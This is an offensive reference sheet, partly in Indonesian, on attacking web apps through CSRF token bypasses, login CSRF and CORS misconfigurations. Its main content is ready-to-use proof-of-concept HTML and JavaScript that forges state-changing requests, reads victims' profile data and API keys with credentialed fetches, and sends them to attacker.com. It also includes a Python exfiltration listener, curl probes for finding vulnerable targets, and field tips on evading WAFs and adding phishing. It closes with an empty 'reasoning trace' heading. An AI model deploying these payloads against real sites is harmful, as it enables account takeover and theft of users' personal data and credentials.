# csrf-cors — web

# CSRF & CORS: Attack and Bypass Reference

## 1. Technique Summary Table

| Technique | Target | Prerequisites | Effect |
|---|---|---|---|
| Missing token | State-changing endpoint without CSRF token | Active cookie session | Forge cross-origin request |
| Null token | Server accepts empty/`null` `csrf_token=` | Loose validation | Request accepted |
| Method swap | GET/POST confusion | Inconsistent router | Bypass token check in one method |
| JSON content-type | JSON endpoint without preflight | `Content-Type: application/json` + token not validated | Bypass token via no-cors fetch fails, via form fails; see §3.4 |
| SameSite=None | Cookie lintas situs | Browser modern (Chrome 80+) | Cross-site request membawa cookie |
| Login CSRF | Login endpoint | No CSRF token in login form | Victim logs in as attacker |
| Origin reflection | CORS misconfig | `Access-Control-Allow-Origin` echo origin | Baca respons cross-origin |
| Null origin | CORS misconfig | Allow `null` | Baca via sandboxed iframe |
| Subdomain wildcard | CORS misconfig | Regex `.*\.target\.com` | XSS in any subdomain → full read |
| Regex bypass | CORS misconfig | Regex not anchored | `target.com.evil.com` or `eviltarget.com` |
| Preflight bypass | CORS misconfig | `Access-Control-Allow-Methods` longgar | PUT/DELETE cross-origin |
| Data theft | CORS misconfig + endpoint sensitif | Credentials mode | Exfil data user |

---

## 2. CSRF Token Bypass

### 2.1 Missing Token

**Dikirim:**
```http
POST /api/v1/user/email HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

email=attacker@evil.com
```

**Muncul:** 200 OK + email berubah.

**Why it works:** The endpoint does not validate the token, or validation only happens in the HTML handler (not the API), or the token middleware is skipped for certain `Content-Type`s (common in Spring Security < 5.7 with `csrf().ignoringAntMatchers("/api/**")`).

**PoC HTML:**
```html
<!DOCTYPE html>
<html><body onload="document.forms[0].submit()">
<form action="https://target.com/api/v1/user/email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
</body></html>
```

### 2.2 Null / Empty / "null" Token

**Sent:** variations of token values considered "empty" by the parser:

```
csrf_token=
csrf_token=null
csrf_token=undefined
csrf_token=0
csrf_token[]=
csrf_token[0]=
```

**Appears:** 200 OK if the server uses the pattern `if (token && !valid(token))` — falsy values pass.

Vulnerable example (PHP 8.1):
```php
if (!empty($_POST['csrf_token']) && $_POST['csrf_token'] !== $_SESSION['csrf']) {
    die('CSRF');
}
// bug: kalau token kosong, blok tidak dieksekusi
```

**Combination:** send two parameters `csrf_token=valid&csrf_token=` — the backend takes the first (valid), the WAF/proxy takes the last (empty). Or vice versa. Test with parameter pollution.

**PoC HTML:**
```html
<form action="https://target.com/settings" method="POST">
  <input name="csrf_token" value="">
  <input name="csrf_token" value="null">
  <input name="email" value="attacker@evil.com">
</form>
```

### 2.3 Method Swap

**Dikirim:**

The `POST /api/profile/update` endpoint validates the token. Try other methods:

```http
GET /api/profile/update?email=attacker@evil.com HTTP/1.1
Host: target.com
Cookie: session=abc123
```
```http
POST /api/profile/update HTTP/1.1
X-HTTP-Method-Override: GET
```

**Appears:** 200 OK if the routing framework treats GET and POST to the same handler but the CSRF filter is only active on POST.

Vulnerable example — Express 4.18:
```js
app.get('/profile/update', updateHandler);
app.post('/profile/update', csrfProtection, updateHandler);
// GET version bisa update state
```

**Varian TRACE:**
```http
TRACE /admin HTTP/1.1
```
If the server reflects the cookie in the body (rare in default nginx 1.25 — 405).

**PUT/PATCH variant to a POST endpoint** if the method parser is inconsistent (e.g. `X-Original-Method` in nginx).

**PoC HTML (method override via form):**
```html
<form action="https://target.com/api/profile/update" method="POST">
  <input type="hidden" name="_method" value="GET">
</form>
<script>
fetch("https://target.com/api/profile/update", {
  method: "POST",
  headers: {"X-HTTP-Method-Override": "GET"},
  body: "email=attacker@evil.com",
  mode: "no-cors"
});
</script>
```

### 2.4 JSON Content-Type

Common claim: "JSON endpoints are safe from CSRF because forms can only send URL-encoded."

This is wrong in three scenarios:

**(a) The server does not check Content-Type.** The JSON parser is used even with `Content-Type: text/plain`:
```http
POST /api/update HTTP/1.1
Content-Type: text/plain

{"email":"attacker@evil.com"}
```
Send via `fetch` with `no-cors` — the body arrives, but the response is unreadable. State still changes.

**PoC HTML:**
```html
<script>
fetch("https://target.com/api/update", {
  method: "POST",
  credentials: "include",
  mode: "no-cors",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

**(b) `Content-Type: application/x-www-form-urlencoded` is accepted by the JSON parser via the body `{"a":"b"}`.** Some frameworks (Spring `@RequestBody` + `FormHttpMessageConverter` fallback, or Fastify with a custom `contentTypeParser`) will parse the body as JSON even with a form content-type. Usually fails — test with a body that is JSON-encoded then URL-encoded.

**(c) `method swap` + JSON.** `POST` JSON without a token, because the CSRF filter is only for `application/x-www-form-urlencoded`:
```java
// Spring Security 5.x default
http.csrf().requiresCsrfProtection(request -> {
    return "application/x-www-form-urlencoded".equals(request.getContentType());
});
// JSON POST lolos
```

**Why it fails on many targets:** Chrome 131 forces a preflight for `Content-Type: application/json` (non-simple). If the server does not set `Access-Control-Allow-Origin`, the request is not sent. The only solution is via `no-cors` with `text/plain`.

### 2.5 SameSite=None

The cookie must be set with `SameSite=None; Secure` for the browser to send it cross-site. This is a prerequisite for all cross-site CSRF in Chrome ≥ 80.

**Dikirim (cookie korban):**
```http
Set-Cookie: session=abc; Secure; SameSite=None; Path=/
```

**Exploit:** `<img src="https://target.com/api/delete?id=1">` — request membawa cookie.

**Cek cookie:**
```bash
curl -sI https://target.com/login | grep -i set-cookie
```

**SameSite=None + Secure** only works over HTTPS. Over HTTP, the cookie is rejected by Chrome 131 → CSRF fails in a local lab if the target is HTTP.

**PoC HTML:**
```html
<img src="https://target.com/api/v1/user/email?email=attacker%40evil.com" width="1" height="1">
```

---

## 3. Login CSRF

**Dikirim:**
```html
<form action="https://target.com/login" method="POST" id="f">
  <input name="username" value="attacker">
  <input name="password" value="P@ssw0rd!">
</form>
<script>document.getElementById('f').submit()</script>
```

**Appears:** The victim logs in as the attacker. All of the victim's activity (uploads, comments, connected accounts) is recorded in the attacker's account.

**Why it works:** The login form has no CSRF token; the session cookie is set by the server to the victim.

**Check:** `curl -s https://target.com/login | grep -i csrf` — no field.

**Variant:** login via OAuth callback without `state` (CSRF to the IdP) — loose `state` parsing, or `state` not checked. Example:
```
https://idp.com/oauth/authorize?client_id=X&redirect_uri=https://target.com/cb&state=&response_type=code
```

---

## 4. CORS Misconfig

### 4.1 Origin Reflection

**Dikirim:**
```http
GET /api/v1/me HTTP/1.1
Origin: https://evil.com
Cookie: session=abc123
```

**Muncul:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Vary: Origin
Content-Type: application/json

{"id":1,"email":"victim@x.com","api_key":"..."}
```

**Why it works:** The code reflects the `Origin` header directly into `Access-Control-Allow-Origin` without a whitelist.

Server rentan (Node.js Express 4.19):
```js
app.use((req,res,next)=>{
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials','true');
  next();
});
```

**PoC HTML lengkap — exfil data:**
```html
<!DOCTYPE html>
<html><body>
<script>
fetch("https://target.com/api/v1/me", {
  credentials: "include"
})
.then(r => r.text())
.then(d => {
  fetch("https://attacker.com/log?d=" + encodeURIComponent(d));
});
</script>
</body></html>
```

**What the attacker needs to prepare:** an endpoint `https://attacker.com/log` (also used for preflight — not needed, since GET is simple). If the target requires a custom header (e.g. `X-Requested-With`), a preflight occurs and the server must echo `Access-Control-Allow-Headers`.

### 4.2 Null Origin

**Dikirim:**
```http
GET /api/v1/me HTTP/1.1
Origin: null
```

**Muncul:** `Access-Control-Allow-Origin: null` + `Allow-Credentials: true`.

**Why it works:** The server whitelists `null` for "file:// or sandbox", but that actually opens up all sandboxed iframes.

**PoC HTML:**
```html
<iframe sandbox="allow-scripts" srcdoc='
<script>
fetch("https://target.com/api/v1/me",{credentials:"include"})
  .then(r=>r.text())
  .then(d=>fetch("https://attacker.com/log?d="+encodeURIComponent(d)));
</script>
'></iframe>
```

`sandbox="allow-scripts"` without `allow-same-origin` → `Origin: null` on every fetch.

Alternative: `data:text/html,<script>...</script>` — null origin. Or local `file://` (Chrome 131 sometimes blocks, Firefox sets null).

**Cek null allow:**
```bash
curl -sI -H "Origin: null" https://target.com/api/me | grep -i access-control
```

### 4.3 Subdomain Wildcard

**Dikirim:**
```http
Origin: https://anything.target.com
```

**Appears:** reflection of any origin ending in `target.com`, plus `Allow-Credentials: true`.

Server rentan (PHP 8.2):
```php
if (preg_match('/target\.com$/', $_SERVER['HTTP_ORIGIN'])) {
    header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']);
    header('Access-Control-Allow-Credentials: true');
}
```

**Why it works:** the regex `$` only anchors at the end of the string — `eviltarget.com` passes (`.target` is not required because `.` in regex = any-char). `target.com.evil.com` fails here, but `eviltarget.com` passes.

**Less strict alternative — wildcard DNS:** `Origin: https://x.target.com` is accepted if the subdomain is taken from a DNS wildcard (`*.target.com` → attacker CNAME). Take a subdomain that can be taken over (S3 bucket deleted, GitHub Pages deleted, Heroku no such app).

**PoC HTML:**
```html
<script>
fetch("https://target.com/api/me",{credentials:"include"})
  .then(r=>r.json())
  .then(j=>new Image().src="https://attacker.com/l?k="+encodeURIComponent(j.api_key));
</script>
```
Hosting at `https://anything.target.com` (a subdomain owned by the attacker).

### 4.4 Regex Bypass

Common vulnerable patterns:

| Regex | Bypass |
|---|---|
| `/target\.com$/` | `eviltarget.com` |
| `/^https?:\/\/.*target\.com/` | `https://target.com.evil.com` |
| `/target\.com/` (no anchor) | `https://evil.com/target.com` — not possible via Origin, but `https://eviltarget.com` if prefix match |
| `/^https:\/\/.*\.target\.com/` | `https://attackertarget.com` (jika regex `.` literal wildcard) |
| `/target\.com$/` + `startsWith('https://')` | `https://x.target.com.attacker.com` (fails), `https://s3.target.com.attacker.com` (passes if `.*` matches) |

**Example bypass `eviltarget.com`:**
```bash
curl -sI -H "Origin: https://eviltarget.com" https://target.com/api/me | grep -i access-control
# Access-Control-Allow-Origin: https://eviltarget.com
```

**Example bypass `https://target.com.evil.com`** for regex without left/right anchors:
```bash
curl -sI -H "Origin: https://target.com.evil.com" https://target.com/api/me | grep -i access-control
```

**PoC HTML** for regex with `endsWith('target.com')` in Java (String.endsWith is case-sensitive, but if the code lower-cases the origin, `TARGET.COM` becomes `target.com`):
```html
<script>
fetch("https://target.com/api/me",{credentials:"include"})
 .then(r=>r.text()).then(t=>fetch("https://attacker.com/log",{method:"POST",body:t}));
</script>
```

### 4.5 Preflight Bypass

**Dikirim (preflight):**
```http
OPTIONS /api/v1/admin/user/1 HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: x-custom, authorization
```

**Server rentan merespons:**
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
Access-Control-Allow-Headers: *
Access-Control-Max-Age: 86400
```

**Why it works:** `Allow-Methods` wildcard-ish + `Allow-Headers: *` opens up all methods. `Allow-Credentials: true` + echo origin = full read.

If `Allow-Credentials: true`, `Access-Control-Allow-Headers: *` **must not** be `*` per spec — Chrome 131 rejects preflight if `*` with credentials. However, many servers misconfigure it and older browsers still work; in Chrome 131 preflight fails. Solution: use explicit `Allow-Headers: x-custom`. Check first.

**Chrome 131 rules to remember:**
- `Allow-Origin: *` + `Allow-Credentials: true` → rejected by browser (not server).
- `Allow-Headers: *` + credentials → rejected. `Allow-Methods` with `*` is **not** valid (must be a literal list).
- `Allow-Origin: null` + credentials → **accepted** (bug/intentional) — this is why null origin still works.

**PoC HTML for DELETE:**
```html
<script>
fetch("https://target.com/api/v1/admin/user/1", {
  method: "DELETE",
  credentials: "include"
}).then(r=>r.text()).then(t=>fetch("https://attacker.com/log",{method:"POST",body:t}));
</script>
```

If the server only allows `GET,POST` in preflight but **does not** re-check on the actual request → use `DELETE` with `Content-Type: text/plain` and a JSON body? Not possible — `DELETE` is not a simple method, preflight is mandatory. Preflight will be blocked if the method is not allowed. Bypass: if the server reflects `Access-Control-Request-Method` without a whitelist (echo header) → it passes.

```http
OPTIONS /api/user/1
Access-Control-Request-Method: DELETE
Origin: https://evil.com
→ Access-Control-Allow-Methods: DELETE   (reflected)
```

**Cek preflight:**
```bash
curl -si -X OPTIONS https://target.com/api/v1/admin/user/1 \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: x-custom"
```

---

## 5. Cross-Origin Data Theft (End-to-End)

**Scenario:** CORS reflect + session cookie.

**Attack form:**

1. Korban buka `https://attacker.com/cors.html`.
2. Browser fetches `https://target.com/api/me` with `credentials: include`.
3. Preflight (jika ada custom header) → server echo origin.
4. Response body berisi data user.
5. Exfil to `attacker.com/log`.

**Complete PoC HTML (print to screen + exfil):**
```html
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>c</title></head>
<body>
<pre id="o">loading...</pre>
<script>
async function steal() {
  const out = document.getElementById('o');
  try {
    const r = await fetch("https://target.com/api/v1/me", {
      method: "GET",
      credentials: "include",
      headers: {"X-Requested-With": "XMLHttpRequest"}
    });
    const text = await r.text();
    out.textContent = text;
    await fetch("https://attacker.com/log", {
      method: "POST",
      mode: "no-cors",
      body: text
    });
  } catch (e) {
    out.textContent = "ERR: " + e;
  }
}
steal();
</script>
</body>
</html>
```

**Note:** the `X-Requested-With` header triggers preflight. Remove it if not needed. If the target requires that header, the server **must** echo it in `Access-Control-Allow-Headers`; otherwise, preflight fails and the body is never read.

**For a POST JSON endpoint:**
```js
await fetch("https://target.com/api/v1/messages", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({to:"attacker", text:"x"})
});
```

**Hosting `attacker.com` must be HTTPS** since 2020 — mixed content in Chrome 131 blocks it. Use Let's Encrypt or Cloudflare.

**Self-hosted exfil endpoint (Python 3.12):**
```python
# log.py — jalankan: python3 log.py
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "https://attacker.com")
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.end_headers()
    def do_OPTIONS(self): self._cors()
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        print(self.rfile.read(n).decode(errors="replace"))
        self._cors()
    def do_GET(self):
        print(self.path)
        self._cors()
HTTPServer(("0.0.0.0", 8080), H).serve_forever()
```
Note: the exfil endpoint (`attacker.com`) must have its own CORS for `fetch` from the attacker page to succeed — however, with `mode: no-cors` it's enough, no CORS headers needed. Simpler to use `<img src>` or `navigator.sendBeacon`.

**Alternative exfil without CORS on the attacker side:**
```js
navigator.sendBeacon("https://attacker.com/log", text);
```
Atau:
```js
new Image().src = "https://attacker.com/log?d=" + encodeURIComponent(text.slice(0,1500));
```

---

## 6. Cek Cepat (Shell)

```bash
# SameSite cookie
curl -sI https://target.com/ | grep -i set-cookie

# CORS reflect
curl -si -H "Origin: https://evil.com" https://target.com/api/me | head -20

# Null origin
curl -si -H "Origin: null" https://target.com/api/me | head -20

# Regex bypass variants
for o in "https://eviltarget.com" "https://target.com.evil.com" "https://x.target.com.attacker.com"; do
  echo "== $o"; curl -si -H "Origin: $o" https://target.com/api/me | grep -i "access-control-allow-origin"
done

# Preflight
curl -si -X OPTIONS https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom"

# CSRF token presence
curl -s https://target.com/form | grep -io "csrf[^>]*"
curl -s https://target.com/api/update -X POST -d "email=a@b.c" -H "Cookie: session=x"
```

---

## 7. Operational Pitfalls That Cause Failures in the Field

1. **Chrome 131 blocks `SameSite=None` without `Secure`.** Visit the target via local `http://` → cookie rejected, CSRF doesn't work. Testing must use HTTPS or set `chrome://flags/#same-site-by-default-cookies` (not practical for real-world).

2. **3rd-party cookie blocking.** Chrome 131 (with gradual Privacy Sandbox) and Safari 17+ block 3rd-party cookies. CORS exploit must use `credentials: "include"` and the target must set `SameSite=None` — if `SameSite=Lax`, the cookie is dropped for cross-site `fetch` except top-level navigation. First test whether the target browser still sends 3rd-party cookies.

3. **Preflight caching.** `Access-Control-Max-Age: 86400` caches the preflight result for 24 hours. If the first preflight fails (e.g., attacker receives 403), Chrome caches that result → 24 hours of failed retries for the same origin. Change the origin (e.g., `attacker.com` vs `www.attacker.com`) or add a query string.

4. **`Allow-Headers: *` with credentials.** The spec forbids it, Chrome 131 rejects it (`Access-Control-Allow-Headers: *` is invalid when `Allow-Credentials: true`). A misconfigured server makes all credentialed requests fail — exploit over. Check `-credentials` in preflight.

5. **`Allow-Origin: *` + `Allow-Credentials: true`.** The server writes both, the browser rejects (it will not expose the body to JS). Many scanners falsely report "vulnerable" — check with real JS, not just headers.

6. **Wildcard DNS but subdomain takeover.** Recon often misses this: check `dig *.target.com` → is there a `CNAME` to `*.s3.amazonaws.com` or `*.herokuapp.com` that has no owner. Without a subdomain that can be controlled, regex bypass in Origin cannot be exploited (the attacker cannot set `Origin` in the browser). CORS exploit needs a page on a whitelisted origin.

7. **Origin `null` from `file://`.** Chrome 131 blocks `file://` fetch to `https://` in many cases (mixed-content-like restriction). Sandboxed iframe is more reliable.

8. **Regex bypass needs a browser, not curl.** `curl` can set any Origin — a server "vulnerable" in curl is not necessarily exploitable: the attacker cannot set Origin in the browser. Validate with a real PoC HTML on a controlled domain (requires DNS/TLS).

9. **Cookies are not sent if `Domain` mismatches.** Exfil from `attacker.com` to `target.com` — the target cookie needs `SameSite=None` **and** `Secure`. If the target sets the `__Host-` prefix, the cookie is only for the exact host (no Domain), still sent by fetch to the target — but cannot be shared to subdomains.

10. **`Content-Type: text/plain` + JSON body in Chrome 131:** `no-cors` fetch with `text/plain` sends the body, but **some frameworks** (e.g., Django REST `JSONParser` with strict content-type) reject it. Test: send `text/plain` with body `{"a":1}` → check whether the server parses it. If the server only parses `application/json`, `no-cors` fails and JSON CSRF is dead (must find another hole).

11. **Method swap via `_method` in a form** only if the framework supports it (`Laravel`, `Spring HideMethodFilter`). Express does not by default. Check `X-HTTP-Method-Override` during recon; if absent, look for GET endpoints that turn out to be state-changing.

12. **Login CSRF requires the victim not to notice.** After logging in as the attacker, the victim must perform an action that attaches to the attacker's account (upload documents, connect OAuth) — otherwise, the impact is zero. Design a post-login payload with automatic redirect, or combine it with a phishing "account confirmation" form.

13. **`Vary: Origin` absent** + CDN (Cloudflare, Fastly) → response with `Allow-Origin: evil.com` gets cached and sent to other victims. This amplifies the impact (cache poisoning), but can also make the PoC fail if the response is cached for `Origin: null` or another origin. Test with `Cache-Control: no-cache` on the fetch side (not possible from plain HTML — use `fetch(..., {cache:"no-store"})`).

14. **TLS/WAF in front of the target** (Cloudflare, Akamai) blocks `Origin: null` and foreign origins using heuristics. If the target is behind Cloudflare 2024+, test `Origin: https://target.com.evil.com` (not `null`) — often bypasses the WAF but still hits the regex bypass.

---

## [reasoning trace]


